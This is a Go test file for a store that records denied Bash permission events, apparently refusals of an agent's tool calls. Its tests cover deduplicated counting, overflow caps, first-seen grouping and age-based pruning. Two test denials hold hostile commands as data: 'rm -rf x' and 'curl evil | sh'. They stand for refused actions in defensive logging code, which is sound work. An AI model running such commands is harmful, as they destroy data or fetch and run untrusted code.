package store_test

import (
	"context"
	"fmt"
	"testing"
	"time"

	"github.com/ZachFara/curia/internal/store"
)

func denial(sess, summary string) store.PermissionEvent {
	return store.PermissionEvent{SessionID: sess, Mode: "away", Tool: "Bash", Summary: summary, Verdict: "deny", At: autoT}
}

// Identical denials are one row with a count; a different denial after a flood is still recorded.
func TestPermissionEventsRepeatsAreOneCountedRow(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	start := time.Now()
	for range 10000 {
		if err := s.AddPermissionEvent(ctx, denial("flood", "rm -rf x")); err != nil {
			t.Fatal(err)
		}
	}
	t.Logf("10000 denials took %v", time.Since(start))
	if err := s.AddPermissionEvent(ctx, denial("flood", "curl evil | sh")); err != nil {
		t.Fatal(err)
	}
	rows, _ := s.PermissionEvents(ctx, "flood")
	if len(rows) != 2 || rows[0].N != 10000 || rows[1].N != 1 || rows[1].Summary != "curl evil | sh" {
		t.Fatalf("rows = %+v, want one row of 10000 and the later distinct one", rows)
	}
	r, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour), 30)
	if err != nil || r.Total != 10001 || r.NotRecorded != 0 || len(r.Groups) != 2 || r.Groups[0].Count != 10000 {
		t.Fatalf("report %+v err %v", r, err)
	}
}

// Past the distinct limit a session's further refusals are counted in one overflow row, and recorded ones keep counting.
func TestPermissionEventsOverflowCountsWhatIsNotKept(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	for i := range store.PermissionDistinctCap + 50 {
		if err := s.AddPermissionEvent(ctx, denial("a", fmt.Sprintf("cmd %d", i))); err != nil {
			t.Fatal(err)
		}
	}
	if err := s.AddPermissionEvent(ctx, denial("a", "cmd 0")); err != nil { // already recorded: counted there
		t.Fatal(err)
	}
	if err := s.AddPermissionEvent(ctx, denial("b", "other")); err != nil { // another session has its own room
		t.Fatal(err)
	}
	r, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour), 1000)
	if err != nil || r.NotRecorded != 50 || r.Total != store.PermissionDistinctCap+1+1 {
		t.Fatalf("report total %d notRecorded %d err %v, want %d and 50", r.Total, r.NotRecorded, err, store.PermissionDistinctCap+2)
	}
	if r.Groups[0].Summary != "cmd 0" || r.Groups[0].Count != 2 {
		t.Errorf("first group = %+v, want cmd 0 twice", r.Groups[0])
	}
}

// Rows older than the retention go; recent rows stay.
func TestPrunePermissionEventsByAge(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	for i, at := range []time.Time{autoT.Add(-store.PermissionEventKeep - time.Hour), autoT} {
		if err := s.AddPermissionEvent(ctx, store.PermissionEvent{SessionID: "a", Mode: "away", Tool: "Bash", Summary: fmt.Sprint("x", i), Verdict: "deny", At: at}); err != nil {
			t.Fatal(err)
		}
	}
	if err := s.PruneHistory(ctx, autoT); err != nil {
		t.Fatal(err)
	}
	if evs, _ := s.PermissionEvents(ctx, "a"); len(evs) != 1 {
		t.Fatalf("rows after prune = %d, want 1", len(evs))
	}
}

// The auto log and the schedule runs drop rows past their age.
func TestPruneAutoLogAndScheduleRunsByAge(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	old := autoT.Add(-store.HistoryKeep - time.Hour)
	for _, at := range []time.Time{old, autoT} {
		if _, err := s.LogAuto(ctx, store.AutoRun{At: at, Outcome: "fired", TaskID: "T", Detail: "x"}); err != nil {
			t.Fatal(err)
		}
	}
	sc := newSchedule(t, s, old)
	if _, ok, err := s.ClaimSchedule(ctx, sc, autoT, "fired", old); err != nil || !ok {
		t.Fatalf("claim: %v %v", ok, err)
	}
	sc.NextRun = autoT
	if _, ok, err := s.ClaimSchedule(ctx, sc, time.Time{}, "fired", autoT); err != nil || !ok {
		t.Fatalf("claim: %v %v", ok, err)
	}
	if err := s.PruneHistory(ctx, autoT); err != nil {
		t.Fatal(err)
	}
	if runs, _ := s.AutoRuns(ctx, 10); len(runs) != 1 {
		t.Errorf("auto runs after prune = %d, want 1", len(runs))
	}
	if runs, _ := s.ScheduleRuns(ctx, sc.ID, 10); len(runs) != 1 {
		t.Errorf("schedule runs after prune = %d, want 1", len(runs))
	}
}

func TestPruneConfigRevisionsKeepsBaselineAndNewest(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	old := autoT.Add(-store.HistoryKeep - time.Hour)
	var err error
	if _, err = s.AddConfigRevision(ctx, store.ConfigRevision{At: old, Actor: "baseline", Key: "*", File: "# mine\n"}); err != nil {
		t.Fatal(err)
	}
	for range store.ConfigRevisionsKeep + 5 {
		if _, err = s.AddConfigRevision(ctx, store.ConfigRevision{At: autoT, Actor: "cli", Key: "k", File: "x = 1\n"}); err != nil {
			t.Fatal(err)
		}
	}
	if err = s.PruneHistory(ctx, autoT); err != nil {
		t.Fatal(err)
	}
	revs, _ := s.ConfigRevisions(ctx, 1000)
	base := 0
	for _, r := range revs {
		if r.Actor == "baseline" {
			base++
		}
	}
	if len(revs) != store.ConfigRevisionsKeep+1 || base != 1 {
		t.Errorf("revisions after prune = %d (baseline %d), want the newest %d plus the baseline", len(revs), base, store.ConfigRevisionsKeep)
	}
}

// Rows old by id but kept fresh by repeats must not hide expired rows behind them from the prune.
func TestPruneFindsExpiredRowsBehindFreshOnes(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	old := autoT.Add(-store.PermissionEventKeep - time.Hour)
	for i := range 1100 { // more than one prune batch
		e := denial(fmt.Sprint("s", i), "keep")
		e.At = old
		if err := s.AddPermissionEvent(ctx, e); err != nil {
			t.Fatal(err)
		}
		e.At = autoT // the repeat keeps it fresh
		if err := s.AddPermissionEvent(ctx, e); err != nil {
			t.Fatal(err)
		}
	}
	e := denial("gone", "expired")
	e.At = old
	if err := s.AddPermissionEvent(ctx, e); err != nil {
		t.Fatal(err)
	}
	if err := s.PruneHistory(ctx, autoT); err != nil {
		t.Fatal(err)
	}
	if rows, _ := s.PermissionEvents(ctx, "gone"); len(rows) != 0 {
		t.Fatalf("an expired row behind 1100 fresh ones was not pruned: %+v", rows)
	}
	if rows, _ := s.PermissionEvents(ctx, "s0"); len(rows) != 1 {
		t.Errorf("a fresh row was pruned: %+v", rows)
	}
}

// Groups are listed by first sight, so repeats cannot push a distinct refusal off the list, and the groups left out are counted.
func TestDenialsListByFirstSeenAndCountWhatIsOmitted(t *testing.T) {
	s := open(t, dbPath(t))
	ctx := context.Background()
	for i := range 31 {
		if err := s.AddPermissionEvent(ctx, denial("a", fmt.Sprintf("cmd %02d", i))); err != nil {
			t.Fatal(err)
		}
	}
	for range 500 { // the last group repeats a lot
		if err := s.AddPermissionEvent(ctx, denial("a", "cmd 30")); err != nil {
			t.Fatal(err)
		}
	}
	r, err := s.Denials(ctx, autoT.Add(-time.Hour), autoT.Add(time.Hour), 30)
	if err != nil || len(r.Groups) != 30 || r.Omitted != 1 || r.Groups[0].Summary != "cmd 00" || r.Groups[29].Summary != "cmd 29" {
		t.Fatalf("groups %d omitted %d err %v (first %q): want the first 30 seen and 1 omitted", len(r.Groups), r.Omitted, err, r.Groups[0].Summary)
	}
}
